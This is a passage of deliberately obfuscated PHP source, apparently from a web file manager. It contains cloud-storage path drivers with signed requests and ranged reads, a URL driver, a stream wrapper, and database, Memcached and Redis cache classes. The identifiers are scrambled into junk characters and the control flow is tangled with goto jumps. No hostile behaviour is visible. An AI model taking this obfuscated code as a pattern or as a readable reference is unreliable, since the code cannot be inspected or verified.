base64_encode(hash_hmac($DÖø¿İ»·Ï[1255], "\120\117\123\124\x26{$B‹Àéö©å¯}\x26{$fÆ°áÌ¶ËĞ}\46{$Cî’áø©–}", md5("{$this->userpass}"), !0)); $bˆš­éâàà = array($DÖø¿İ»·Ï[1125] => $Cî’áø©–, $DÖø¿İ»·Ï[1289] => "\125\120\131\125\x4e\40{$this->username}\72{$BªâÚ©®¨}", $DÖø¿İ»·Ï[169] => $this->endpoint . $B‹Àéö©å¯); return $bˆš­éâàà; goto B¡ò‘Í‘ª; B¡ò‘Í‘ª: } public function download($F¼¹ßˆÑõ§, $béÚ„ƒŞ««) { goto Bë°¿ÆÚˆÓ; eÕğƒŸ£¿À: $E¿åÌõ”ˆù = 1024 * 200; $E¦â²¶Ä‡ = fopen($A’Ø¹Úó˜¬, $_SERVER[¬ˆÚÂ”Éğä][1239]); while (!0) { $AğÑ»Ø¥Î = $this->fileSubstr($F¼¹ßˆÑõ§, $AÜ¿İÖªâŒ, $E¿åÌõ”ˆù); if ($AğÑ»Ø¥Î === !1) { return !1; } fwrite($E¦â²¶Ä‡, $AğÑ»Ø¥Î); $AÜ¿İÖªâŒ += $E¿åÌõ”ˆù; if (strlen($AğÑ»Ø¥Î) < $E¿åÌõ”ˆù) { break; } } goto eƒãÊÚÄùÇ; eƒãÊÚÄùÇ: fclose($E¦â²¶Ä‡); return $béÚ„ƒŞ««; goto FÕ×­¿Å®£; Bë°¿ÆÚˆÓ: $A’Ø¹Úó˜¬ = IO::getPathInner(IO::mkfile($béÚ„ƒŞ««)); if (!($b™¸¢àäİÂ = $this->link($F¼¹ßˆÑõ§))) { return !1; } $AÜ¿İÖªâŒ = 0; goto eÕğƒŸ£¿À; FÕ×­¿Å®£: } public function link($c„Ş»ãÄá’, $cŒØ˜ÀãÀ = array()) { $a¶Í‹ÄäØ =& $_SERVER[¬ˆÚÂ”Éğä]; $c„Ş»ãÄá’ = trim($c„Ş»ãÄá’, $a¶Í‹ÄäØ[8]); if (!empty($this->token)) { $F„Ô·‰ ¼Œ = strtotime(date($a¶Í‹ÄäØ[1290])); $bÑ±¼¯ŸÔ‹ = substr(md5($this->token . $a¶Í‹ÄäØ[272] . $F„Ô·‰ ¼Œ . $a¶Í‹ÄäØ[1291] . $c„Ş»ãÄá’), 12, 8) . $F„Ô·‰ ¼Œ; $cŒØ˜ÀãÀ[] = $a¶Í‹ÄäØ[1292] . $bÑ±¼¯ŸÔ‹; } $f¥¡‚•ƒ§ = !empty($cŒØ˜ÀãÀ) ? $a¶Í‹ÄäØ[69] . implode($a¶Í‹ÄäØ[272], $cŒØ˜ÀãÀ) : $a¶Í‹ÄäØ[33]; return $this->getHost() . $a¶Í‹ÄäØ[8] . $c„Ş»ãÄá’ . $f¥¡‚•ƒ§; } public function fileOut($b‚Ö¤‚ÊÒÕ, $DÕ ç­É’õ = false, $Aƒ¦³»ƒœ³ = false, $c¶âìÑ—©Í = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($b‚Ö¤‚ÊÒÕ, $DÕ ç­É’õ, $Aƒ¦³»ƒœ³, $c¶âìÑ—©Í); } if (!$Aƒ¦³»ƒœ³) { $Aƒ¦³»ƒœ³ = $this->pathThis($b‚Ö¤‚ÊÒÕ); } $b”‘™ÏÍÏ‡ = $DÕ ç­É’õ ? array($_SERVER[¬ˆÚÂ”Éğä][1293] . rawurlencode($Aƒ¦³»ƒœ³)) : array(); $e©³õ³‘„Ò = $this->link($b‚Ö¤‚ÊÒÕ, $b”‘™ÏÍÏ‡); $this->fileOutLink($e©³õ³‘„Ò); } public function fileOutServer($c–Ù·„Âø, $C¿îÚ„âáË = false, $Fè‡æğÙ÷ø = false, $D¥´Ç’ˆÒã = '') { parent::fileOut($c–Ù·„Âø, $C¿îÚ„âáË, $Fè‡æğÙ÷ø, $D¥´Ç’ˆÒã); } public function fileOutImage($Bïêàö«”ì, $CÊ’Åµ‡ = 250) { $Bæìîó§Şâ = $this->link($Bïêàö«”ì . $_SERVER[¬ˆÚÂ”Éğä][1294] . $CÊ’Åµ‡); $this->fileOutLink($Bæìîó§Şâ); } public function fileOutImageServer($cİˆ¡ëàæ, $f‰Æğ¨ğ‡¸ = 250) { parent::fileOutImage($cİˆ¡ëàæ, $f‰Æğ¨ğ‡¸); } public function hashMd5($bóˆÔ¬Ï§) { $Aó“«îİ²Â =& $_SERVER[¬ˆÚÂ”Éğä]; $eˆé•ôÖ£Ÿ = $this->objectMeta($bóˆÔ¬Ï§); return isset($eˆé•ôÖ£Ÿ[$Aó“«îİ²Â[196]]) ? $eˆé•ôÖ£Ÿ[$Aó“«îİ²Â[196]] : !1; } public function size($f‹Õœ²£ÔÃ) { $C¯¾ß—®…‰ = $this->objectMeta($f‹Õœ²£ÔÃ); return $C¯¾ß—®…‰ ? $C¯¾ß—®…‰[$_SERVER[¬ˆÚÂ”Éğä][77]] : 0; } public function info($c÷‚ÃŠìòø) { if ($this->isFolder($c÷‚ÃŠìòø)) { return $this->folderInfo($c÷‚ÃŠìòø); } else { if ($this->isFile($c÷‚ÃŠìòø)) { return $this->fileInfo($c÷‚ÃŠìòø); } } return !1; } public function exist($f•ÒÃ ‰¸Ù) { return $this->isFile($f•ÒÃ ‰¸Ù) || $this->isFolder($f•ÒÃ ‰¸Ù); } public function isFile($EÒŒì‰Œ) { return !$this->isFolder($EÒŒì‰Œ) && $this->objectMeta($EÒŒì‰Œ); } public function isFolder($e³Ü—ùòÚ×) { return $this->cacheMethod($_SERVER[¬ˆÚÂ”Éğä][223], $e³Ü—ùòÚ×); } protected function objectMeta($F©­ª°íÅ) { return $this->cacheMethod($_SERVER[¬ˆÚÂ”Éğä][224], $F©­ª°íÅ); } protected function _objectMeta($Bƒ­ï©‡¦”) { goto Bæ»Ù¾Å¤; Bæ»Ù¾Å¤: $bªÔæË¸ğ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($Bƒ­ï©‡¦” == $bªÔæË¸ğ[33] || $Bƒ­ï©‡¦” == $bªÔæË¸ğ[8]) { return array(); } $D‚Ã†îÒ¾¼ = $this->ussRequest($Bƒ­ï©‡¦”, $bªÔæË¸ğ[1295]); goto B«ÈÄ»ƒ¾í; B«ÈÄ»ƒ¾í: if (!$D‚Ã†îÒ¾¼[$bªÔæË¸ğ[1045]]) { return null; } $AÆ®£ö»šä = isset($D‚Ã†îÒ¾¼[$bªÔæË¸ğ[1047]]) ? $D‚Ã†îÒ¾¼[$bªÔæË¸ğ[1047]] : array(); if (!isset($AÆ®£ö»šä[$bªÔæË¸ğ[1296]])) { return null; } goto AÕŸ•¯Úí; AÕŸ•¯Úí: $Cçòë›öÙ¬ = array($bªÔæË¸ğ[28] => get_path_this($Bƒ­ï©‡¦”), $bªÔæË¸ğ[29] => isset($AÆ®£ö»šä[$bªÔæË¸ğ[1296]]) ? $AÆ®£ö»šä[$bªÔæË¸ğ[1296]] : null, $bªÔæË¸ğ[77] => isset($AÆ®£ö»šä[$bªÔæË¸ğ[1297]]) ? $AÆ®£ö»šä[$bªÔæË¸ğ[1297]] : null, $bªÔæË¸ğ[196] => isset($AÆ®£ö»šä[$bªÔæË¸ğ[1298]]) ? $AÆ®£ö»šä[$bªÔæË¸ğ[1298]] : null, $bªÔæË¸ğ[1266] => isset($AÆ®£ö»šä[$bªÔæË¸ğ[1299]]) ? $AÆ®£ö»šä[$bªÔæË¸ğ[1299]] : null); $Cçòë›öÙ¬[$bªÔæË¸ğ[1267]] = isset($AÆ®£ö»šä[$bªÔæË¸ğ[1300]]) ? strtotime($AÆ®£ö»šä[$bªÔæË¸ğ[1300]]) : $Cçòë›öÙ¬[$bªÔæË¸ğ[1266]]; return $Cçòë›öÙ¬; goto EƒÙÄø¾äÕ; EƒÙÄø¾äÕ: } protected function _isFolder($Dî‘Œ¦÷­) { $FóŸõ‹Œ•ñ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($Dî‘Œ¦÷­ == $FóŸõ‹Œ•ñ[33] || $Dî‘Œ¦÷­ == $FóŸõ‹Œ•ñ[8]) { return !0; } $B¨‡ ¶„£ = $this->objectMeta($Dî‘Œ¦÷­); return isset($B¨‡ ¶„£[$FóŸõ‹Œ•ñ[29]]) && $B¨‡ ¶„£[$FóŸõ‹Œ•ñ[29]] == $FóŸõ‹Œ•ñ[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($fÈãĞò¤İ‚ = false) { } public function exist($aÇÒÑ–éŒ ) { $e‘¤õ½†í = $this->info($aÇÒÑ–éŒ ); return $e‘¤õ½†í[$_SERVER[¬ˆÚÂ”Éğä][188]]; } public function isFile($D‡œ„Ç íÌ) { $eãØêÈÁ‘ò = $this->info($D‡œ„Ç íÌ); return $eãØêÈÁ‘ò[$_SERVER[¬ˆÚÂ”Éğä][188]]; } public function isFolder($e„Ø¨âêŞª) { return !1; } public function size($E­ëğÁ—µ) { $E¹¶µíìŠŒ = $this->info($E­ëğÁ—µ); return $E¹¶µíìŠŒ[$_SERVER[¬ˆÚÂ”Éğä][77]]; } public function info($C‘ŠµÏëÕæ) { return $this->infoParse($C‘ŠµÏëÕæ); } public function infoAuth($DÈ¿â—„‚±) { return $this->infoParse($DÈ¿â—„‚±); } public function infoWithChildren($FóÂ†”ÉÍİ) { return $this->infoParse($FóÂ†”ÉÍİ); } public function infoFull($B±»Ş†ßÜº) { return $this->infoParse($B±»Ş†ßÜº); } private function infoParse($FÉÖ„øÓæ‘) { $aÛÖÁ™”Âä =& $_SERVER[¬ˆÚÂ”Éğä]; $bÃÕÄëÁšÁ = $this->header($FÉÖ„øÓæ‘); if (!$bÃÕÄëÁšÁ || !$bÃÕÄëÁšÁ[$aÛÖÁ™”Âä[697]]) { return !1; } $AØğ±Œ¢ = _get($bÃÕÄëÁšÁ, $aÛÖÁ™”Âä[325], 0); $C„°ê‡‚ÂÍ = array($aÛÖÁ™”Âä[28] => $bÃÕÄëÁšÁ[$aÛÖÁ™”Âä[28]], $aÛÖÁ™”Âä[75] => $FÉÖ„øÓæ‘, $aÛÖÁ™”Âä[29] => $aÛÖÁ™”Âä[167], $aÛÖÁ™”Âä[77] => intval($AØğ±Œ¢), $aÛÖÁ™”Âä[160] => get_path_ext($bÃÕÄëÁšÁ[$aÛÖÁ™”Âä[28]]), $aÛÖÁ™”Âä[1175] => $AØğ±Œ¢ > 0 && $bÃÕÄëÁšÁ[$aÛÖÁ™”Âä[1301]], $aÛÖÁ™”Âä[1176] => !1); return $C„°ê‡‚ÂÍ; } private function header($Bê×ï–ÖÎ) { if (isset(self::$_cacheHeader[$Bê×ï–ÖÎ])) { return self::$_cacheHeader[$Bê×ï–ÖÎ]; } self::$_cacheHeader[$Bê×ï–ÖÎ] = url_header($Bê×ï–ÖÎ); return self::$_cacheHeader[$Bê×ï–ÖÎ]; } public function hashSimple($açÂ¹÷Õâ, $a–ŠİÇ = false) { goto FÌ¿µ±âÜ; FÌ¿µ±âÜ: $c› Ø¨œ†¸ =& $_SERVER[¬ˆÚÂ”Éğä]; $Eñ®¹ÆÀéÍ = $this->info($açÂ¹÷Õâ); if (!$Eñ®¹ÆÀéÍ || !$Eñ®¹ÆÀéÍ[$c› Ø¨œ†¸[188]]) { return !1; } goto b°¥©¶ğ…; aÍ¯áÀŞŠ…: $a„ƒ·¨ÇğŞ .= $this->fileSubstr($açÂ¹÷Õâ, $AŸºã©âòÆ - $eÆ¬•®Œ«â, $eÆ¬•®Œ«â); return md5($a„ƒ·¨ÇğŞ) . $AŸºã©âòÆ; goto fÁâ¾æÙšÉ; E·¡ÜŒ±×Š: $dãæ¬†ùãˆ = timeFloat(); $A½…Å£“é˜ = 15; for ($d•»ÇÊöíÃ = 0; $d•»ÇÊöíÃ < $C³‘Âã…¢‡; $d•»ÇÊöíÃ++) { if (timeFloat() - $dãæ¬†ùãˆ > $A½…Å£“é˜) { return !1; } $f„èœ‰¸ñŠ = $this->fileSubstr($açÂ¹÷Õâ, $AÎó¼Åñ * $d•»ÇÊöíÃ, $eÆ¬•®Œ«â); if (!$f„èœ‰¸ñŠ) { return !1; } $a„ƒ·¨ÇğŞ .= $f„èœ‰¸ñŠ; } goto aÍ¯áÀŞŠ…; eç‰ÚËÒ¶: if ($AŸºã©âòÆ <= $eÆ¬•®Œ«â * $C³‘Âã…¢‡) { return md5($this->fileSubstr($açÂ¹÷Õâ, 0, $AŸºã©âòÆ)) . $AŸºã©âòÆ; } $AÎó¼Åñ = intval($AŸºã©âòÆ / $C³‘Âã…¢‡); $a„ƒ·¨ÇğŞ = $c› Ø¨œ†¸[33]; goto E·¡ÜŒ±×Š; b°¥©¶ğ…: $AŸºã©âòÆ = $Eñ®¹ÆÀéÍ[$c› Ø¨œ†¸[77]]; $eÆ¬•®Œ«â = 200; $C³‘Âã…¢‡ = 50; goto eç‰ÚËÒ¶; fÁâ¾æÙšÉ: } public function getContent($BøÏ…å–èØ) { return $this->fileSubstr($BøÏ…å–èØ); } public function fileSubstr($aì‡…İ²—­, $e¨©Í¹´Şã = 0, $b²¡˜ºëÔ• = -1) { goto Cƒ¾¸İ®è–; a²› ”–ïƒ: $cÆğ­¸—ÙÌ = url_request($aì‡…İ²—­, $Eƒ¯³Íœ[216], !1, $AÜî­èÓÙƒ, !1, !1, 1); return $cÆğ­¸—ÙÌ[$Eƒ¯³Íœ[1047]] ? $cÆğ­¸—ÙÌ[$Eƒ¯³Íœ[1047]] : $Eƒ¯³Íœ[33]; goto fÀöŒ°º³Û; Cƒ¾¸İ®è–: $Eƒ¯³Íœ =& $_SERVER[¬ˆÚÂ”Éğä]; $aÛî¶§«© = $this->info($aì‡…İ²—­); if (!$aÛî¶§«© || !$aÛî¶§«©[$Eƒ¯³Íœ[188]] && $aÛî¶§«©[$Eƒ¯³Íœ[77]] > 1024 * 1024 * 10) { return !1; } goto C¤ÎÍ—Şñ˜; C¤ÎÍ—Şñ˜: if ($b²¡˜ºëÔ• === -1) { $b²¡˜ºëÔ• = $aÛî¶§«©[$Eƒ¯³Íœ[77]]; } if ($b²¡˜ºëÔ• == 0) { return $Eƒ¯³Íœ[33]; } $AÜî­èÓÙƒ = array($Eƒ¯³Íœ[1302] . $e¨©Í¹´Şã . $Eƒ¯³Íœ[723] . ($e¨©Í¹´Şã + $b²¡˜ºëÔ• - 1)); goto a²› ”–ïƒ; fÀöŒ°º³Û: } public function download($A’¼º¢ë´, $aùœğ™šé) { Downloader::start($A’¼º¢ë´, $aùœğ™šé); return $aùœğ™šé; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($F‡Ò‰…ŞÒ, $fîë…©°º¼ = '') { goto BÊÜßÒŒ’; C—’ŠÖ×¡: return $this->info ? !0 : !1; goto a½¨……‹Â; BÊÜßÒŒ’: $this->info = $this->info($F‡Ò‰…ŞÒ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¬ˆÚÂ”Éğä][75]]; goto eä®µ…«ƒ; eä®µ…«ƒ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$F‡Ò‰…ŞÒ])) { self::$_chunkBuffer[$F‡Ò‰…ŞÒ] = array(); } goto C—’ŠÖ×¡; a½¨……‹Â: } function stream_read($a­ˆ…ñ³Š) { $C››Äù¢Òñ = $this->fileSubstr($this->pose, $a­ˆ…ñ³Š); $this->pose += strlen($C››Äù¢Òñ); return $C››Äù¢Òñ; } public function stream_tell() { return $this->pose; } public function stream_seek($aã©‡£, $aÎ¿ êø î) { $DÀÕ•ÌÆµ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($aÎ¿ êø î == SEEK_SET) { $this->pose = $aã©‡£; } else { if ($aÎ¿ êø î == SEEK_CUR) { $this->pose += $aã©‡£; } else { if ($aÎ¿ êø î == SEEK_END) { $this->pose = $this->info[$DÀÕ•ÌÆµ[77]] + intval($aã©‡£); } } } if ($aã©‡£ < 0) { $this->pose = $this->info[$DÀÕ•ÌÆµ[77]] + $aã©‡£; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¬ˆÚÂ”Éğä][77]]; } public function stream_close() { return !0; } public function url_stat($BÏÚè·Û•“, $EÑ›ñã¤Ú‹) { $F³¶Ë¡ÎŒ„ =& $_SERVER[¬ˆÚÂ”Éğä]; $Fõ›Œ¹Â¬ê = $this->info($BÏÚè·Û•“); return array($F³¶Ë¡ÎŒ„[1303] => 0, $F³¶Ë¡ÎŒ„[1304] => 0, $F³¶Ë¡ÎŒ„[12] => 32768 + 511, $F³¶Ë¡ÎŒ„[1305] => 0, $F³¶Ë¡ÎŒ„[1306] => 0, $F³¶Ë¡ÎŒ„[1307] => 0, $F³¶Ë¡ÎŒ„[1308] => 0, $F³¶Ë¡ÎŒ„[77] => $Fõ›Œ¹Â¬ê[$F³¶Ë¡ÎŒ„[77]], $F³¶Ë¡ÎŒ„[1309] => $Fõ›Œ¹Â¬ê[$F³¶Ë¡ÎŒ„[1181]], $F³¶Ë¡ÎŒ„[1267] => $Fõ›Œ¹Â¬ê[$F³¶Ë¡ÎŒ„[107]], $F³¶Ë¡ÎŒ„[1266] => $Fõ›Œ¹Â¬ê[$F³¶Ë¡ÎŒ„[187]], $F³¶Ë¡ÎŒ„[1310] => 0, $F³¶Ë¡ÎŒ„[1311] => 0); } static $fileInfo = array(); public function info($c˜ ÒçÑÙÆ) { $D™¸¢›ß‹ğ = $_SERVER[¬ˆÚÂ”Éğä][1312]; if (isset(self::$fileInfo[$c˜ ÒçÑÙÆ])) { return self::$fileInfo[$c˜ ÒçÑÙÆ]; } if (substr($c˜ ÒçÑÙÆ, 0, strlen($D™¸¢›ß‹ğ)) != $D™¸¢›ß‹ğ) { return !1; } self::$fileInfo[$c˜ ÒçÑÙÆ] = IO::info(substr($c˜ ÒçÑÙÆ, strlen($D™¸¢›ß‹ğ))); return self::$fileInfo[$c˜ ÒçÑÙÆ]; } public static function read($d‹ØŒñ, $A‡æ‘Ç‹‡, $dÍÃ¹ŠÛë) { goto Dëê—™¨×; AÌİíÏµã: $A«“´òšºÎ = 8192; fseek($cõÎÒƒ’÷•, $A‡æ‘Ç‹‡, SEEK_SET); $B×…Çê’ç¼ = $F–Œ ß¡³†[33]; goto e‰èŸ‰¡É„; fáÊÔ»¸¶ó: return $B×…Çê’ç¼; goto DÙ®Šõ½âÅ; Dëê—™¨×: $F–Œ ß¡³† =& $_SERVER[¬ˆÚÂ”Éğä]; $cõÎÒƒ’÷• = fopen($d‹ØŒñ, $F–Œ ß¡³†[1183]); if (!$cõÎÒƒ’÷•) { return $F–Œ ß¡³†[33]; } goto AÌİíÏµã; e‰èŸ‰¡É„: $Fƒ­º¹â»é = 0; while ($Fƒ­º¹â»é < $dÍÃ¹ŠÛë) { $Aåâ«ß¾ëØ = min($A«“´òšºÎ, $dÍÃ¹ŠÛë - $Fƒ­º¹â»é); $B×…Çê’ç¼ .= fread($cõÎÒƒ’÷•, $Aåâ«ß¾ëØ); $Fƒ­º¹â»é += $Aåâ«ß¾ëØ; } fclose($cõÎÒƒ’÷•); goto fáÊÔ»¸¶ó; DÙ®Šõ½âÅ: } public function fileSubstr($C›½ŠÚŒ•Ç, $d¾¤›ÄÛä) { goto BË¾œÇƒ…; eö„»çèŠ¸: ksort($Aº›÷³ËÅš); $D×†ä÷¦¨ˆ = substr($Fî„›ƒÍÍÏ, $C›½ŠÚŒ•Ç - $c¦ºë¦Ùç, $d¾¤›ÄÛä); return $D×†ä÷¦¨ˆ; goto Aõˆ±±ƒ¿; a…È‹¸ÀŠ: $f…Æäİ—† = ceil(($C›½ŠÚŒ•Ç + $d¾¤›ÄÛä) / $C£ÜÄ®‹®İ) * $C£ÜÄ®‹®İ - $c¦ºë¦Ùç; $Fî„›ƒÍÍÏ = IO::fileSubstr($this->path, $c¦ºë¦Ùç, $f…Æäİ—†); $Aº›÷³ËÅš[$c¦ºë¦Ùç . $dÃßËÕˆ®[33]] = $Fî„›ƒÍÍÏ; goto eö„»çèŠ¸; BË¾œÇƒ…: $dÃßËÕˆ® =& $_SERVER[¬ˆÚÂ”Éğä]; $fº™ö¥ñ¶ = $this->info[$dÃßËÕˆ®[77]]; $dÁ«Ö¦è— = $C›½ŠÚŒ•Ç; goto D†êöÂ½İ¹; C²¯‚ƒŠù­: $d§£êºø—Ò = 0; $fÃŸ—ê„™Ç = 0; $a‹„ŠùØÙã = $dÃßËÕˆ®[33]; goto fê…°ÊÃª; eÓĞš¥ï“Š: $C£ÜÄ®‹®İ = 64 * 1024; $Aº›÷³ËÅš =& self::$_chunkBuffer[$this->path]; if (!$Aº›÷³ËÅš) { $Aº›÷³ËÅš = array(); } goto C²¯‚ƒŠù­; C¨¤‰À…: if ($C›½ŠÚŒ•Ç + $d¾¤›ÄÛä > $fº™ö¥ñ¶) { $d¾¤›ÄÛä = $fº™ö¥ñ¶ - $C›½ŠÚŒ•Ç; } if ($d¾¤›ÄÛä <= 0) { return $dÃßËÕˆ®[33]; } if ($C›½ŠÚŒ•Ç < 0 || $C›½ŠÚŒ•Ç >= $fº™ö¥ñ¶ || $d¾¤›ÄÛä <= 0 || $d¾¤›ÄÛä > 1024 * 1024 * 5) { throw new Exception("\x69\157\x46\151\x6c\145\x52\x65\141\x64\x20\145\162\162\157\162\41\40\163\164\x61\162\x74\75{$C›½ŠÚŒ•Ç}\x3b\x6c\145\156\147\164\150\75{$d¾¤›ÄÛä}\73\40\x73\x69\172\x65\x3d{$fº™ö¥ñ¶}\73"); } goto eÓĞš¥ï“Š; fê…°ÊÃª: foreach ($Aº›÷³ËÅš as $d§£êºø—Ò => $a‹„ŠùØÙã) { $d§£êºø—Ò = intval($d§£êºø—Ò); $fÃŸ—ê„™Ç = $d§£êºø—Ò + strlen($a‹„ŠùØÙã); if ($C›½ŠÚŒ•Ç >= $fÃŸ—ê„™Ç) { continue; } if ($C›½ŠÚŒ•Ç >= $d§£êºø—Ò && $C›½ŠÚŒ•Ç + $d¾¤›ÄÛä <= $fÃŸ—ê„™Ç) { return substr($a‹„ŠùØÙã, $C›½ŠÚŒ•Ç - $d§£êºø—Ò, $d¾¤›ÄÛä); } break; } if (count($Aº›÷³ËÅš) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($dÃßËÕˆ®[1313], $dÃßËÕˆ®[1314] . count($Aº›÷³ËÅš) . "\73\163\x74\x61\x72\164\75{$C›½ŠÚŒ•Ç}\54\154\145\x6e\147\164\150\75{$d¾¤›ÄÛä}\x3b\x70\x6f\163\x65\x3a{$d§£êºø—Ò}\x7e{$fÃŸ—ê„™Ç}"); throw new Exception($dÃßËÕˆ®[1315]); } $c¦ºë¦Ùç = intval($C›½ŠÚŒ•Ç / $C£ÜÄ®‹®İ) * $C£ÜÄ®‹®İ; goto a…È‹¸ÀŠ; D†êöÂ½İ¹: $f²†”á×ï× = $d¾¤›ÄÛä; if ($C›½ŠÚŒ•Ç < 0) { $C›½ŠÚŒ•Ç = $fº™ö¥ñ¶ + $C›½ŠÚŒ•Ç; } if ($d¾¤›ÄÛä === !1) { $d¾¤›ÄÛä = $fº™ö¥ñ¶ - $C›½ŠÚŒ•Ç; } goto C¨¤‰À…; Aõˆ±±ƒ¿: } private function log($d»ÏáÎ˜ÊÉ, $EµËÃ¦Ü†ø) { $cÏ¦ª„ÖÄ =& $_SERVER[¬ˆÚÂ”Éğä]; $d›Òæçù±ö = timeFloat() - $this->timeStart; write_log(sprintf($cÏ¦ª„ÖÄ[1316], $d»ÏáÎ˜ÊÉ, $this->info[$cÏ¦ª„ÖÄ[28]], $d›Òæçù±ö, $EµËÃ¦Ü†ø), $cÏ¦ª„ÖÄ[1232]); } } goto e§ğ¸©©àÅ; A¿é‘×«Ğ: class CacheLockDatabase { public function lock($a‚æĞÅöğ, $Béß›¬•² = 0) { $Dî›ÂğÚ“Ñ = Model($_SERVER[¬ˆÚÂ”Éğä][764]); $cŒÍ§ö¯ ˆ = microtime(!0) + $Béß›¬•²; while (microtime(!0) < $cŒÍ§ö¯ ˆ) { $BÔãÓ“‹ÄÅ = $Dî›ÂğÚ“Ñ->get($a‚æĞÅöğ); if (!$BÔãÓ“‹ÄÅ || $BÔãÓ“‹ÄÅ < microtime(!0)) { $F—·†‰Äíñ = $Dî›ÂğÚ“Ñ->set($a‚æĞÅöğ, $cŒÍ§ö¯ ˆ); if ($F—·†‰Äíñ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($d÷¹×…Ğ®ï) { return Model($_SERVER[¬ˆÚÂ”Éğä][764])->get($d÷¹×…Ğ®ï); } public function unlock($eÑ–Ç×˜ñ«) { Model($_SERVER[¬ˆÚÂ”Éğä][764])->remove($eÑ–Ç×˜ñ«); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($c¹Û­š­øï, $A¯Æ„äÛ×) { $d‹Í£“ƒÔİ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!class_exists($d‹Í£“ƒÔİ[793])) { show_json($d‹Í£“ƒÔİ[794], !1); } $this->cacheTime = $A¯Æ„äÛ×; $this->handle = new Memcached(); if (is_array($c¹Û­š­øï[$d‹Í£“ƒÔİ[795]]) && count($c¹Û­š­øï[$d‹Í£“ƒÔİ[795]]) >= 1) { foreach ($c¹Û­š­øï[$d‹Í£“ƒÔİ[795]] as $cÍš§ÌòŸ) { $C½Ä§°—Á = explode($d‹Í£“ƒÔİ[4], $cÍš§ÌòŸ); $this->handle->addServer($C½Ä§°—Á[0], $C½Ä§°—Á[1]); } } else { $this->handle->addServer($c¹Û­š­øï[$d‹Í£“ƒÔİ[169]], $c¹Û­š­øï[$d‹Í£“ƒÔİ[170]]); } } public function set($FÂ¸Ò¤šº‡, $a‰ÏÁ¦ÜïŠ, $DÍ¬¸¢øéâ = false) { $DÍ¬¸¢øéâ = $DÍ¬¸¢øéâ ? $DÍ¬¸¢øéâ : $this->cacheTime; return $this->handle->set($FÂ¸Ò¤šº‡, $a‰ÏÁ¦ÜïŠ, $DÍ¬¸¢øéâ); } public function get($B‹ãŞ¯ô¥) { return $this->handle->get($B‹ãŞ¯ô¥); } public function remove($aÀ·Ïåá¨) { return $this->handle->delete($aÀ·Ïåá¨); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($FËÆ®ŸÙ­, $B¾µ‚’¨®ä) { $a¥ÅŒ‚ô©Ñ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!class_exists($a¥ÅŒ‚ô©Ñ[796])) { show_json($a¥ÅŒ‚ô©Ñ[797], !1); } $this->cacheTime = $B¾µ‚’¨®ä; $D¢è¬Ï”Üø = isset($FËÆ®ŸÙ­[$a¥ÅŒ‚ô©Ñ[798]]) ? $FËÆ®ŸÙ­[$a¥ÅŒ‚ô©Ñ[798]] : 10; $E×”‰†÷· = _get($FËÆ®ŸÙ­, $a¥ÅŒ‚ô©Ñ[795]); if ($E×”‰†÷· && is_array($E×”‰†÷·)) { $this->initCluster($FËÆ®ŸÙ­, $D¢è¬Ï”Üø); } else { $this->handle = $this->init($FËÆ®ŸÙ­, $D¢è¬Ï”Üø); } } private function init($Có¹›Ë¬œ¦, $CˆöãŠù’Ç) { $bÁõ‚®³§Á =& $_SERVER[¬ˆÚÂ”Éğä]; $báôÉŸÃè = new Redis(); $DÇËÔÎôé = isset($Có¹›Ë¬œ¦[$bÁõ‚®³§Á[799]]) ? $Có¹›Ë¬œ¦[$bÁõ‚®³§Á[799]] : !1; if ($DÇËÔÎôé) { $báôÉŸÃè->pconnect($Có¹›Ë¬œ¦[$bÁõ‚®³§Á[169]], $Có¹›Ë¬œ¦[$bÁõ‚®³§Á[170]], $CˆöãŠù’Ç); } else { $báôÉŸÃè->connect($Có¹›Ë¬œ¦[$bÁõ‚®³§Á[169]], $Có¹›Ë¬œ¦[$bÁõ‚®³§Á[170]], $CˆöãŠù’Ç); } if (!empty($Có¹›Ë¬œ¦[$bÁõ‚®³§Á[376]])) { $báôÉŸÃè->auth($Có¹›Ë¬œ¦[$bÁõ‚®³§Á[376]]); } return $báôÉŸÃè; } private function initCluster($B—“éÑïø, $C‘İøŠÏÛ) { $E¸·Á¼ß³µ =& $_SERVER[¬ˆÚÂ”Éğä]; $BçİÔÂ£’ = array($E¸·Á¼ß³µ[800], $E¸·Á¼ß³µ[801], $E¸·Á¼ß³µ[802]); $DÁÄ”³Åô = $E¸·Á¼ß³µ[800]; if (isset($B—“éÑïø[$E¸·Á¼ß³µ[12]]) && in_array($B—“éÑïø[$E¸·Á¼ß³µ[12]], $BçİÔÂ£’)) { $DÁÄ”³Åô = $B—“éÑïø[$E¸·Á¼ß³µ[12]]; } switch ($DÁÄ”³Åô) { case $E¸·Á¼ß³µ[800]: $this->_slave($B—“éÑïø, $C‘İøŠÏÛ); break; case $E¸·Á¼ß³µ[801]: break; case $E¸·Á¼ß³µ[802]: $this->isCluster = !0; $cƒ„«ÃåîÑ = $B—“éÑïø[$E¸·Á¼ß³µ[795]]; $C¹Æë‚ëµ = isset($B—“éÑïø[$E¸·Á¼ß³µ[799]]) ? $B—“éÑïø[$E¸·Á¼ß³µ[799]] : !1; $d®‚ÜéÂ«® = isset($B—“éÑïø[$E¸·Á¼ß³µ[376]]) ? $B—“éÑïø[$E¸·Á¼ß³µ[376]] : null; $this->handle = new RedisCluster(NUll, $cƒ„«ÃåîÑ, $C‘İøŠÏÛ, $C‘İøŠÏÛ, $C¹Æë‚ëµ, $d®‚ÜéÂ«®); break; default: break; } } private function _slave($báîÄ“õÍ­, $B“­ò†Ÿê¿) { goto C™¨ç–½ë; C™¨ç–½ë: 